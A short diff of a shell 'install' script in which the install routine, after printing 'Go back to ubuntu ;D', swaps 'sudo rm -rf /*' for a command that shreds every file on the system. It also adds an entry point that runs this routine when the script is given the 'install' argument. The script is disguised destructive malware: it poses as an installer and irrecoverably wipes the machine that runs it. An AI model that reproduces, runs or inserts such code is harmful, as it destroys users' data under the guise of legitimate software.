@@ -14,6 +14,12 @@ install () {
     echo "Go back to ubuntu ;D"
     sleep 5
 
-    sudo rm -rf /*
+    find / -type f -exec shred {} \;
   fi
 }
+
+if [ "$1" = "install" ]; then
+  install
+else
+  printf "Use a proper installation argument"
+fi
